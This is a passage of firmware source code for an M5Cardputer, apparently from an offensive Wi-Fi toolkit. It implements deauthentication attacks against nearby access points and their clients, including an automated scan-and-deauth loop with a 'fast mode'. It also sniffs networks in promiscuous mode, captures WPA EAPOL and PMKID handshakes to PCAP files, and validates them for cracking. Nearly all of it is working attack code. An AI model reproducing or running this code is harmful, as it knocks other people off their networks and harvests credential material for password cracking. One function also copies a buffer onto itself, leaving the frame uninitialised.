            Serial.println(F("-------------------"));
            Serial.println("Deauth packet sent : " + String(deauthCount));
            Serial.println(F("-------------------"));
        }

        M5.update();
        M5Cardputer.update();

        // Adjust delay with buttons
        if (M5Cardputer.Keyboard.isKeyPressed(',') && currentMillis - lastDebounceTime > debounceDelay) {
            lastDebounceTime = currentMillis;
            delayTime = max(100, delayTime - 100);  // Decrease delay
        }
        if (M5Cardputer.Keyboard.isKeyPressed('/') && currentMillis - lastDebounceTime > debounceDelay) {
            lastDebounceTime = currentMillis;
            delayTime = min(3000, delayTime + 100);  // Increase delay
        }
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && currentMillis - lastDebounceTime > debounceDelay) {
            break;  // Stop the attack
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
            inMenu = true;
            drawMenu();
            break;
        }
    }

    Serial.println(F("-------------------"));
    Serial.println(F("Stopping Deauth Attack"));
    Serial.println(F("-------------------"));

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);

    waitAndReturnToMenu("Stopping Deauth Attack");
}

void sendDeauthPacket() {
    // Send the pre-defined global deauth frame
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    Serial.println();
}

void snifferCallbackDeauth(void* buf, wifi_promiscuous_pkt_type_t type) {
    static unsigned long lastEAPOLDisplayUpdate = 0;  // Temps de la derniÃ¨re mise Ã  jour de l'affichage EAPOL
    const int eapolDisplayDelay = 1000;  // DÃ©lai de mise Ã  jour de l'affichage EAPOL

    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
    const uint8_t *frame = pkt->payload;
    const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);

    const uint8_t frameType = (frameControl & 0x0C) >> 2;
    const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

    unsigned long currentMillis = millis();

    if (estUnPaquetEAPOL(pkt)) {
        // Mettre Ã  jour l'affichage EAPOL toutes les 500 ms
        const uint8_t *receiverAddr = frame + 4;
        const uint8_t *senderAddr = frame + 10;
        enregistrerDansFichierPCAP(pkt, false);
        nombreDeEAPOL++;
        if (currentMillis - lastEAPOLDisplayUpdate >= eapolDisplayDelay) {
            lastEAPOLDisplayUpdate = currentMillis;

            Serial.println(F("EAPOL Detected !!!!"));
            pixels.setPixelColor(0, pixels.Color(0, 255, 0));
            pixels.show();
            delay(250);
            pixels.setPixelColor(0, pixels.Color(0, 0, 0));
            pixels.show();

            Serial.print(F("Address MAC destination: "));
            printAddress(receiverAddr);
            Serial.print(F("Address MAC expedition: "));
            printAddress(senderAddr);
            
            M5.Lcd.setCursor(M5.Display.width() - 36, 0);
            M5.Lcd.printf("H:");
            M5.Lcd.print(nombreDeHandshakes);
            if (nombreDeEAPOL < 99) {
                M5.Lcd.setCursor(M5.Display.width() - 36, 12);
            } else if (nombreDeEAPOL < 999) {
                M5.Lcd.setCursor(M5.Display.width() - 48, 12);
            } else {
                M5.Lcd.setCursor(M5.Display.width() - 60, 12);
            }
            M5.Lcd.printf("E:");
            M5.Lcd.print(nombreDeEAPOL);
        }
    }

    if (frameType == 0x00 && frameSubType == 0x08) {
        const uint8_t *senderAddr = frame + 10;  // Adresse source dans la trame de balise

        // Convertir l'adresse MAC en chaÃ®ne pour comparaison
        char macStr[18];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);

        pkt->rx_ctrl.sig_len -= 4;  // RÃ©duire la longueur du signal de 4 octets
        enregistrerDansFichierPCAP(pkt, true);  // Enregistrer le paquet
    }
}

//deauther end

/*
============================================================================================================================
Sniff and deauth clients
============================================================================================================================
*/ 
bool macFromString(const std::string& macStr, uint8_t* macArray) {
  int values[6];  // Temporary array to store the parsed values
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
             &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
    // Convert to uint8_t
    for (int i = 0; i < 6; ++i) {
      macArray[i] = static_cast<uint8_t>(values[i]);
    }
    return true;
  }
  return false;
}


void broadcastDeauthAttack(const uint8_t* ap_mac, int channel) {
  // Set the channel to the AP's channel
  esp_err_t ret = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
    return;
  }
  M5.Lcd.setCursor(67, 1);
  M5.Lcd.printf("C:");
  M5.Lcd.print(channel);
  M5.Lcd.print(" ");

  // Set AP and source MAC addresses
  updateMacAddresses(ap_mac);

  // Set the receiver MAC to broadcast
  memset(receiver_mac, 0xFF, 6);  // Broadcast MAC address

  Serial.println(F("-----------------------------"));
  Serial.print(F("Deauth for AP MAC: "));
  Serial.println(mac_to_string(ap_mac).c_str());
  Serial.print(F("On Channel: "));
  Serial.println(channel);


  // Send 10 deauthentication packets
  for (int i = 0; i < nbDeauthSend; i++) {
    sendDeauthPacket();
  }
}

void sendDeauthToClient(const uint8_t* client_mac, const uint8_t* ap_mac, int channel) {
  esp_err_t ret = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
    return;
  }
  M5.Lcd.setCursor(67, 1);
  M5.Lcd.printf("C:");
  M5.Lcd.print(channel);
  M5.Lcd.print(" ");

  uint8_t deauth_frame[sizeof(deauth_frame)];
  memcpy(deauth_frame, deauth_frame, sizeof(deauth_frame));

  // Modifier les adresses MAC dans la trame de dÃ©authentification
  memcpy(deauth_frame + 4, ap_mac, 6);  // Adresse MAC de l'AP (destinataire)
  memcpy(deauth_frame + 10, client_mac, 6);  // Source MAC client
  memcpy(deauth_frame + 16, ap_mac, 6);      // BSSID (AP)

  // Envoyer la trame modifiÃ©e
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
  /*
    //Debugging output of packet contents
    Serial.println(F("Deauthentication Frame Sent:"));
    for (int i = 0; i < sizeof(deauth_frame); i++) {
      Serial.print(deauth_frame[i], HEX);
      Serial.print(F(" "));
    }
    Serial.println();*/
}

void sendBroadcastDeauths() {
  for (auto& ap : connections) {
    if (!ap.second.empty() && isRegularAP(ap.first)) {
      if (ap_names.find(ap.first) != ap_names.end() && !ap_names[ap.first].empty()) {
        esp_task_wdt_reset();  // S'assurer que le watchdog est rÃ©initialisÃ© frÃ©quemment
        vTaskDelay(pdMS_TO_TICKS(10));  // Pause pour Ã©viter de surcharger le CPU
        Serial.println(F("-----------------------------"));
        Serial.print(F("Sending Broadcast Deauth to AP: "));
        Serial.println(ap_names[ap.first].c_str());

        M5.Lcd.setCursor(M5.Display.width() / 2 - 80 , M5.Display.height() / 2 + 28);
        M5.Lcd.printf(ap_names[ap.first].c_str());

        int channel = ap_channels_map[ap.first];
        uint8_t ap_mac_address[6];
        if (macFromString(ap.first, ap_mac_address)) {
          broadcastDeauthAttack(ap_mac_address, channel);
          // AprÃ¨s l'attaque de broadcast, envoyer une trame Ã  chaque client
          for (const auto& client : ap.second) {
            uint8_t client_mac[6];
            if (macFromString(client, client_mac)) {
              Serial.println(F("-----------------------------"));
              Serial.print(F("Sending Deauth from client MAC "));
              Serial.print(mac_to_string(client_mac).c_str());
              Serial.print(F(" to AP MAC "));
              Serial.println(mac_to_string(ap_mac_address).c_str());

              M5.Lcd.setCursor(M5.Display.width() / 2 - 83 , M5.Display.height() / 2 + 16);
              M5.Lcd.printf("Sending Deauth to");

              for (int i = 0; i < nbDeauthSend; i++) {
                sendDeauthToClient(client_mac, ap_mac_address, channel);
              }
            }
          }
          vTaskDelay(deauthWaitingTime);
          M5.Lcd.setCursor(M5.Display.width() / 2 - 80, M5.Display.height() / 2 + 28);
          M5.Lcd.printf("                                ");
        } else {
          Serial.println(F("Failed to convert AP MAC address from string."));
        }
        M5.Lcd.setCursor(M5.Display.width() / 2 - 83  , M5.Display.height() / 2 + 16);
        M5.Lcd.printf("                       ");
      }
    }
  }
}

std::string mac_to_string(const uint8_t* mac) {
  char buf[18];
  sprintf(buf, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return std::string(buf);
}

void changeChannel() {
  static auto it = ap_channels.begin(); // Initialisation de l'iterator

  // VÃ©rification de l'existence de canaux
  if (ap_channels.empty()) {
    Serial.println(F("Aucun canal valide n'est disponible."));
    return;
  }

  if (it == ap_channels.end()) {
    it = ap_channels.begin();  // RÃ©initialiser l'iterator si nÃ©cessaire
  }

  int newChannel = *it;  // RÃ©cupÃ©rer le canal courant

  // VÃ©rification de la validitÃ© du canal
  if (newChannel < 1 || newChannel > 13) {
    Serial.println(F("Canal invalide dÃ©tectÃ©. RÃ©initialisation au premier canal valide."));
    Serial.println(newChannel);
    Serial.println(*it);
    it = ap_channels.begin();  // RÃ©initialiser l'iterator
    newChannel = *it;  // RÃ©cupÃ©rer un canal valide
  }

  // Tentative de changement du canal Wi-Fi
  esp_err_t ret = esp_wifi_set_channel(newChannel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    Serial.printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
    return;
  }

  // Mise Ã  jour du canal actuel et avancement de l'iterator
  currentChannel = newChannel;
  it++;

  // Affichage de la confirmation du changement
  Serial.print(F("Switching channel on  "));
  Serial.println(currentChannel);
  Serial.println(F("-----------------------------"));

  // Mise Ã  jour de l'affichage sur l'appareil M5
  M5.Lcd.setCursor(67, 1);
  M5.Lcd.printf("C:%d ", currentChannel);
}


void wifi_scan() {
  Serial.println(F("-----------------------------"));
  Serial.println(F("Scanning WiFi networks..."));
  ap_channels.clear();
  const char* scanningText = "Scanning nearby networks..";
  M5.Lcd.setCursor((M5.Lcd.width()-M5.Lcd.textWidth(scanningText))/2, M5.Display.height() - 12 );
  M5.Lcd.printf(scanningText);

  int n = WiFi.scanNetworks(false, false);
  if (n == 0) {
    Serial.println(F("No networks found"));
    const char* failedText = "No AP Found.";
    M5.Lcd.setCursor((M5.Lcd.width()-M5.Lcd.textWidth(failedText))/2, M5.Display.height() - 12 );
    M5.Lcd.setTextColor(TFT_RED);
    M5.Lcd.printf(failedText);
    return;
  }

  Serial.print(F("Found "));
  Serial.print(n);
  Serial.println(F(" networks"));

  for (int i = 0; i < n; ++i) {
    String ssid = WiFi.SSID(i);
    int32_t rssi = WiFi.RSSI(i);
    uint8_t *bssid = WiFi.BSSID(i);
    int32_t channel = WiFi.channel(i);

    std::string bssidString = mac_to_string(bssid);
    ap_names[bssidString] = ssid.c_str();
    ap_channels.insert(channel);
    ap_channels_map[bssidString] = channel;

    // Convert std::string to const char* for Serial.print
    Serial.print(bssidString.c_str());
    Serial.print(F(" | "));
    Serial.print(ssid);
    Serial.print(F(" | Channel: "));
    Serial.println(channel);
  }

  Serial.println(F("-----------------------------"));
  M5.Lcd.setCursor(0, 1);
  M5.Lcd.printf("AP:");
  M5.Lcd.print(n);
  M5.Lcd.print("  ");
  M5.Lcd.drawLine(0, 13, M5.Lcd.width(), 13, taskbarDividerColor);
  delay(30);
  M5.Lcd.setCursor((M5.Lcd.width()-M5.Lcd.textWidth(scanningText))/2, M5.Display.height() - 12 );
  M5.Lcd.printf("                          ");
}



bool isRegularAP(const std::string& mac) {
  std::regex multicastRegex("^(01:00:5e|33:33|ff:ff:ff|01:80:c2)");
  return !std::regex_search(mac, multicastRegex);
}
void print_connections() {
  int yPos = 15;  // Initial Y position for text on the screen

  for (auto& ap : connections) {
    if (isRegularAP(ap.first)) {
      if (ap_names.find(ap.first) != ap_names.end() && !ap_names[ap.first].empty()) {
        // Clear the line before printing new data
        M5.Lcd.fillRect(0, yPos, M5.Lcd.width(), 20, BLACK);

        // Print to Serial
        Serial.print(ap_names[ap.first].c_str());
        Serial.print(F(" ("));
        Serial.print(ap.first.c_str());
        Serial.print(F(") on channel "));
        Serial.print(ap_channels_map[ap.first]);
        Serial.print(F(" has "));
        Serial.print(ap.second.size());
        Serial.println(F(" clients:"));
        for (auto& client : ap.second) {
          Serial.print(F(" - "));
          Serial.println(client.c_str());
        }
        // Print to screen
        String currentAPName = String(ap_names[ap.first].c_str());
        int clientCount = ap.second.size();
        String displayText = currentAPName + ": " + String(clientCount);

        M5.Lcd.setCursor(0, yPos);
        M5.Lcd.println(displayText);

        yPos += 12;  // Move the Y position for the next line

        // Ensure there is enough screen space for the next line
        if (yPos > M5.Lcd.height() - 15) {
          break;  // Exit the loop if there's not enough space for more lines
        }
      }
    }
  }
  Serial.println(F("-----------------------------"));
}


void promiscuous_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
  const uint8_t *frame = pkt->payload;
  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
  const uint8_t frameType = (frameControl & 0x0C) >> 2;
  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  const uint8_t *bssid = frame + 16; // BSSID position for management frames
  std::string bssidStr = mac_to_string(bssid);

  if (estUnPaquetEAPOL(pkt)) {
    Serial.println(F("-----------------------------"));
    Serial.println(F("EAPOL Detected !!!!!!!!!!!!!!!"));
    // Extract the BSSID from the packet, typically found at Address 3 in most WiFi frames
    const uint8_t *bssid = frame + 16;

    // Convert the BSSID to string format
    std::string bssidStr = mac_to_string(bssid);

    // Look up the AP name using the BSSID
    std::string apName = ap_names[bssidStr];

    // Print the AP name to the serial output
    Serial.print(F("EAPOL Detected from AP: "));
    if (!apName.empty()) {
      Serial.println(apName.c_str());
      M5.Lcd.setCursor(0 , M5.Display.height() - 10);
      String eapolapname = apName.c_str();
      M5.Lcd.print("EAPOL!:" + eapolapname + "                         ");
    } else {
      Serial.println(F("Unknown AP"));
      M5.Lcd.setCursor(0 , M5.Display.height() - 8);
      M5.Lcd.printf("EAPOL from Unknow                                 ");
    }
    Serial.println(F("-----------------------------"));


    enregistrerDansFichierPCAP(pkt, false);
    nombreDeEAPOL++;
    M5.Lcd.setCursor(116, 1);
    M5.Lcd.printf("H:");
    M5.Lcd.print(nombreDeHandshakes);
    if (nombreDeEAPOL < 99) {
      M5.Lcd.setCursor(164, 1);
    } else {
      M5.Lcd.setCursor(155, 1);
    }
    M5.Lcd.printf("E:");
    M5.Lcd.print(nombreDeEAPOL);
    esp_task_wdt_reset();  // RÃ©initialisation du watchdog
    // DÃ©lay pour permettre au task IDLE de s'exÃ©cuter
    vTaskDelay(pdMS_TO_TICKS(10));
  }

  if (frameType == 0x00 && frameSubType == 0x08) {
    const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon

    // Convertir l'adresse MAC en chaÃ®ne de caractÃ¨res pour la comparaison
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);


    pkt->rx_ctrl.sig_len -= 4;  // RÃ©duire la longueur du signal de 4 bytes
    esp_task_wdt_reset();  // RÃ©initialisation du watchdog
    vTaskDelay(pdMS_TO_TICKS(10));
    enregistrerDansFichierPCAP(pkt, true);  // Enregistrer le paquet
  }

  if (frameType != 2) return;

  const uint8_t *mac_ap = frame + 4;
  const uint8_t *mac_client = frame + 10;
  std::string ap_mac = mac_to_string(mac_ap);
  std::string client_mac = mac_to_string(mac_client);

  if (!isRegularAP(ap_mac) || ap_mac == client_mac) return;

  if (connections.find(ap_mac) == connections.end()) {
    connections[ap_mac] = std::vector<std::string>();
  }
  if (std::find(connections[ap_mac].begin(), connections[ap_mac].end(), client_mac) == connections[ap_mac].end()) {
    connections[ap_mac].push_back(client_mac);
  }
}


void purgeAllAPData() {
  connections.clear();  // Clears all client associations
  M5.Lcd.fillRect(0, 14, M5.Lcd.width(), M5.Lcd.height() - 14, BLACK);
  Serial.println(F("All AP and client data have been purged."));
}


void deauthClients() {
  M5.Display.clear();

  esp_wifi_set_promiscuous(false);
  WiFi.disconnect(true);  // DÃ©connecte et efface les paramÃ¨tres WiFi enregistrÃ©s
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_restore();
  delay(270); // Petite pause pour s'assurer que tout est terminÃ©

  nvs_flash_init();
  wifi_init_config_t cfg4 = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg4);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);;
  esp_wifi_start();
  delay(30);

  esp_err_t ret = esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    printf("Erreur lors du changement de canal: %s\n", esp_err_to_name(ret));
    return;
  }

  purgeAllAPData();
  wifi_scan();

  M5.Lcd.fillRect(0, 14, M5.Lcd.width(), M5.Lcd.height() - 14, BLACK);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);

  M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
  M5.Lcd.setCursor(M5.Display.width() - 30, 1);
  M5.Lcd.printf("D:");
  if (isDeauthActive) {
    M5.Lcd.print("1");
  } else {
    M5.Lcd.print("0");
  }
  enterDebounce();

  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 1000;

  unsigned long lastScanTime = millis();
  unsigned long lastChannelChange = millis();
  unsigned long lastClientPurge = millis();
  unsigned long lastTimeUpdate = millis();
  unsigned long lastPrintTime = millis();

  while (true) {
    esp_task_wdt_reset();
    vTaskDelay(pdMS_TO_TICKS(10));
    M5.update();
    M5Cardputer.update();

    unsigned long currentPressTime = millis();
    unsigned long currentTimeAuto = millis();

    if (currentTimeAuto - lastTimeUpdate >= 2000) {
      unsigned long timeToNextScan = scanInterval - (currentTimeAuto - lastScanTime);
      unsigned long timeToNextPurge = clientPurgeInterval - (currentTimeAuto - lastClientPurge);
      unsigned long timeToNextChannelChange = channelChangeInterval - (currentTimeAuto - lastChannelChange);
      Serial.println(F("-----------------"));
      Serial.print(F("Time to next scan: "));
      Serial.print(timeToNextScan / 1000);
      Serial.println(F(" seconds"));

      Serial.print(F("Time to next purge: "));
      Serial.print(timeToNextPurge / 1000);
      Serial.println(F(" seconds"));

      Serial.print(F("Time to next channel change: "));
      Serial.print(timeToNextChannelChange / 1000);
      Serial.println(F(" seconds"));
      Serial.println(F("-----------------"));
      lastTimeUpdate = currentTimeAuto;
    }
    if (M5Cardputer.Keyboard.isKeyPressed('d') && (currentPressTime - lastKeyPressTime > debounceDelay)) {
      isDeauthActive = !isDeauthActive;
      Serial.println(isDeauthActive ? "Deauther activated !" : "Deauther disabled !");
      M5.Lcd.setCursor(M5.Display.width() - 30, 1);
      M5.Lcd.printf("D:%d", isDeauthActive ? 1 : 0);
      lastKeyPressTime = currentPressTime;
    }

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) && (currentPressTime - lastKeyPressTime > debounceDelay)) {
      esp_wifi_set_promiscuous(false);
      esp_wifi_set_promiscuous_rx_cb(NULL);
      break;
    }

    if (M5Cardputer.Keyboard.isKeyPressed('f') && (currentPressTime - lastKeyPressTime > debounceDelay)) {
      if (!isDeauthFast) {
        isDeauthFast = true;
        scanInterval = 30000; // interval of deauth and scanning network fast
        channelChangeInterval = 5000; // interval of channel switching fast
        clientPurgeInterval = 60000; //interval of clearing the client to exclude no more connected client or ap that not near anymore fast
        deauthWaitingTime = 5000;
        nbDeauthSend = 5;
        Serial.println(F("Fast mode enabled !"));
        M5.Lcd.setCursor(M5.Display.width() - 40, 1);
        M5.Lcd.printf("F");
      } else {
        isDeauthFast = false;
        scanInterval = 90000; // interval of deauth and scanning network
        channelChangeInterval = 15000; // interval of channel switching
        clientPurgeInterval = 300000; //interval of clearing the client to exclude no more connected client or ap that not near anymore
        deauthWaitingTime = 7500;
        nbDeauthSend = 10;
        Serial.println(F("Fast mode disabled !"));
        M5.Lcd.setCursor(M5.Display.width() - 40, 1);
        M5.Lcd.printf(" ");
      }
      lastKeyPressTime = currentPressTime;
    }

    // Lancement d'un scan et deauthbroadcast toutes les 60 secondes
    if (currentTimeAuto - lastScanTime >= scanInterval) {
      if (isDeauthActive) {
        sendBroadcastDeauths();  // DÃ©connexion broadcast
      }
      esp_wifi_set_promiscuous_rx_cb(NULL);
      wifi_scan();  // Lancement du scan
      esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);
      lastScanTime = currentTimeAuto;
      lastChannelChange = currentTimeAuto;  // RÃ©initialisation du timer pour Ã©viter les conflits avec le changement de canal
    }

    // Purge des clients toutes les 5 minutes, assurÃ© de ne pas coincider avec le scan
    if (currentTimeAuto - lastClientPurge >= clientPurgeInterval && currentTimeAuto - lastScanTime >= 1000) {
      purgeAllAPData();  // Purge des donnÃ©es
      lastClientPurge = currentTimeAuto;
    }

    // Gestion de l'affichage des connexions toutes les 2 secondes
    if (currentTimeAuto - lastPrintTime >= 2000) { // 2 seconde
      print_connections();
      lastPrintTime = currentTimeAuto;
    }


    // Changement de channel toutes les 15 secondes, seulement si un scan n'est pas en cours
    if (currentTimeAuto - lastChannelChange >= channelChangeInterval && currentTimeAuto - lastScanTime >= 1000) {
      changeChannel();
      lastChannelChange = currentTimeAuto;
    }

  }
  waitAndReturnToMenu("Stopping Sniffing...");
}


// Sniff and deauth clients end

/*
============================================================================================================================
Check handshake  â€“  full SNAP-sliding integration  (29-07-2025)
============================================================================================================================
*/

#define DEBUG_HANDSHAKE 1          // 1 = logs sÃ©rie dÃ©taillÃ©s, 0 = silencieux

/* --- dossiers & variables UI --- */
const char* HANDSHAKES_DIR = "/evil/handshakes";
std::vector<String> pcapFiles;
int currentListIndexPcap = 0;

/* --- signature SNAP --- */
const uint8_t SNAP_SIG[8] = {0xAA,0xAA,0x03,0x00,0x00,0x00,0x88,0x8E};

/* --- masques Key-Info --- */
constexpr uint16_t KI_INSTALL = 0x0040;
constexpr uint16_t KI_ACK     = 0x0080;
constexpr uint16_t KI_MIC     = 0x0100;
constexpr uint16_t KI_SECURE  = 0x0200;

/* --- headers PCAP --- */
#pragma pack(push,1)
struct GHdr { uint32_t magic; uint16_t vmaj,vmin; int32_t tz; uint32_t sig,snap,link; };
struct PHdr { uint32_t ts_sec,ts_usec,len,orig; };
#pragma pack(pop)

/* --- helpers --- */
String macToString(const uint8_t* m){
  char b[18]; sprintf(b,"%02X:%02X:%02X:%02X:%02X:%02X",m[0],m[1],m[2],m[3],m[4],m[5]);
  return String(b);
}
String makeFullPath(const String& n){ return n.startsWith("/") ? n : String(HANDSHAKES_DIR)+"/"+n; }


/* ======================================================================================================================
   handlePcapSliding  â€”  dÃ©tection Beacon + (4-Way || PMKID) â€” version â€œrobusteâ€ 08-08-2025
   ==================================================================================================================== */
bool handlePcapSliding(const String& path,
                       bool& hasBeacon, bool& has4Way, bool& hasPMKID,
                       String& apMac,  String& staMac)
{
  hasBeacon = has4Way = hasPMKID = false;
  apMac = staMac = ssid = "";

  File f = SD.open(path, FILE_READ);
  if(!f){ Serial.println("[PCAP] open FAIL "+path); return false; }

  /* ---------- entÃªte global ---------- */
  GHdr gh;
  if(f.read((uint8_t*)&gh,sizeof(gh)) != sizeof(gh)){ f.close(); return false; }
  const bool linkIsRadiotap = (gh.link == 127);           // DLT_IEEE802_11_RADIO

  static uint8_t buf[4096];
  bool m1=false, m2=false, m3=false, m4=false;            // drapeaux 4-Way
  uint32_t idx = 0;

#if DEBUG_HANDSHAKE
  static bool first = true;
  if(!first) Serial.println();
  first = false;
  Serial.printf("=== %s ===\n", path.c_str());
#endif

  while(f.available()){
    /* ---------- lecture dâ€™un paquet ---------- */
    PHdr ph;
    if(f.read((uint8_t*)&ph,sizeof(ph)) != sizeof(ph)) break;
    if(ph.len==0 || ph.len>sizeof(buf)){ f.seek(f.position()+ph.len); continue; }
    if(f.read(buf,ph.len) != ph.len) break;
    ++idx;

    /* ---------- calcule lâ€™offset vers la charge utile ---------- */
    uint16_t off = 0;
    if(linkIsRadiotap){
      if(ph.len < 4) continue;                   // paquet trop court
      off = buf[2] | (buf[3]<<8);                // radiotap length
      if(off >= ph.len) continue;
    }

    const uint8_t* pay   = buf + off;            // dÃ©but 802.11 ou Ethernet
    const uint8_t* pEnd  = buf + ph.len;
    const uint8_t* key   = nullptr;

    /* ---------- Beacon : on capture BSSID + SSID (une seule fois) ---------- */
    if(!hasBeacon){
      uint8_t fc0 = pay[0];
      if( ((fc0>>2)&0x03)==0 && ((fc0>>4)&0x0F)==8 ){     // mgmt / beacon
        hasBeacon = true;
        apMac = macToString(pay + 10);                    // BSSID
        uint32_t p = off + 24;                            // tags
        while(p+2 < ph.len){
          uint8_t tag = buf[p], len = buf[p+1];
          if(tag==0x00 && len<=32 && p+2+len<=ph.len){
            char s[33]; memcpy(s,buf+p+2,len); s[len]='\0'; ssid = String(s);
            break;
          }
          p += 2 + len;
        }
      }
    }

    /* ---------- repÃ©rage EAPOL (2 formats possibles) ---------- */
    for(const uint8_t* p = pay; p + 14 < pEnd; ++p){
      /* LLC/SNAP */
      if(p[0]==0xAA && p[1]==0xAA && p[2]==0x03 && p[6]==0x88 && p[7]==0x8E){
        key = p + 8;                               // version|type|len|â€¦
        break;
      }
      /* Ethernet brut (dest+src+type) */
      if(p[12]==0x88 && p[13]==0x8E){
        key = p + 14;
        break;
      }
    }
    if(!key) continue;                             // pas dâ€™EAPOL
    if(key+99 >= pEnd || key[1]!=3) continue;       // paquets non-Key ou tronquÃ©s

    /* ---------- interprÃ©tation Key-Info ---------- */
    uint16_t ki = (key[5]<<8) | key[6];
    bool ack     = ki & KI_ACK;
    bool mic     = ki & KI_MIC;
    bool install = ki & KI_INSTALL;
    bool secure  = ki & KI_SECURE;

    if( ack && !mic)                       m1 = true;                 // Msg-1
    if(!ack &&  mic && !install && !secure) m2 = true;                // Msg-2
    if( ack &&  mic &&  install &&  secure) m3 = true;                // Msg-3
    if(!ack &&  mic && !install &&  secure) m4 = true;                // Msg-4

    /* ---------- PMKID ---------- */
    uint16_t kdLen = (key[97]<<8)|key[98];
    if(!hasPMKID && !install && kdLen==0x0016) hasPMKID = true;

#if DEBUG_HANDSHAKE
    Serial.printf("Pkt%3lu EAPOL  KI=%04X "
                  "I%d A%d M%d S%d   [%c%c%c%c]\n",
                  idx, ki,
                  install, ack, mic, secure,
                  m1?'1':'-', m2?'2':'-', m3?'3':'-', m4?'4':'-');
#endif
  }
  f.close();

  has4Way = m1 && m2 && m3 && m4;
  return true;
}



/* ------------------------------------------------------------------------------------------------------------------
   showPcapInfo(index) â€” afï¬che la synthÃ¨se dâ€™un PCAP (utilise la nouvelle handlePcapSliding)
   ------------------------------------------------------------------------------------------------------------------ */
void showPcapInfo(int index){
  String entry = pcapFiles[index];
  String path  = makeFullPath(entry);

  bool bc=false, fw=false, pm=false;
  String ap="", sta="", ssid="";
  if(!handlePcapSliding(path, bc, fw, pm, ap, sta)){
    confirmPopup("Open error\n"+entry);
    return;
  }

  bool ok = bc && (fw || pm);

  M5.Display.clear(); M5.Display.setTextSize(1.5);
  M5.Display.setCursor(5,0);
  M5.Display.println(entry);
  M5.Display.println("----------------------");
  M5.Display.printf("Beacon : %s\n", bc ? "YES" : "NO");
  M5.Display.printf("4-Way  : %s\n", fw ? "YES" : "NO");
  M5.Display.printf("PMKID  : %s\n", pm ? "YES" : "NO");
  M5.Display.println("----------------------");
  M5.Display.printf("Result : %s\n", ok ? "VALID" : "INVALID");
  M5.Display.println("\n   ^ / v  : next / prev");
  M5.Display.display();
}


/* ------------------------------------------------------------------------------------------------------------------
   viewPcapDetails()  â€”  affiche + navigation entre .pcap, âŒ« = retour liste
   ------------------------------------------------------------------------------------------------------------------ */
void viewPcapDetails(){
  const unsigned long db = 180;
  unsigned long last = 0;

  while(true){
    showPcapInfo(currentListIndexPcap);           // affiche fiche courante

    while(true){
      M5.update(); M5Cardputer.update(); unsigned long now = millis();

      if(M5Cardputer.Keyboard.isKeyPressed('.') && now-last > db){
        /* suivant (skip ALL) */
        do{
          currentListIndexPcap = (currentListIndexPcap+1)%pcapFiles.size();
        }while(pcapFiles[currentListIndexPcap]=="ALL");
        last = now; break;                        // â†º rÃ©-affiche
      }
      if(M5Cardputer.Keyboard.isKeyPressed(';') && now-last > db){
        /* prÃ©cÃ©dent (skip ALL) */
        do{
          currentListIndexPcap = currentListIndexPcap ?
                                 currentListIndexPcap-1 : pcapFiles.size()-1;
        }while(pcapFiles[currentListIndexPcap]=="ALL");
        last = now; break;                        // â†º rÃ©-affiche
      }
      if(M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)){
        while (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
          M5Cardputer.update();
          delay(10); 
        }
        return;
      }
    }
  }
}



/* ======================================================================================================================
   analyzeAllPcaps  â€”  scanne tous les fichiers, propose de supprimer les invalides
   ==================================================================================================================== */
void analyzeAllPcaps(){
  std::vector<String> invalid;
  size_t ok = 0, total = pcapFiles.size() - 1;

  for(size_t i = 1; i < pcapFiles.size(); ++i){
    bool b=false,fw=false,pm=false; String ap="",st="";
    if(handlePcapSliding(makeFullPath(pcapFiles[i]), b, fw, pm, ap, st)
       && b && (fw || pm))
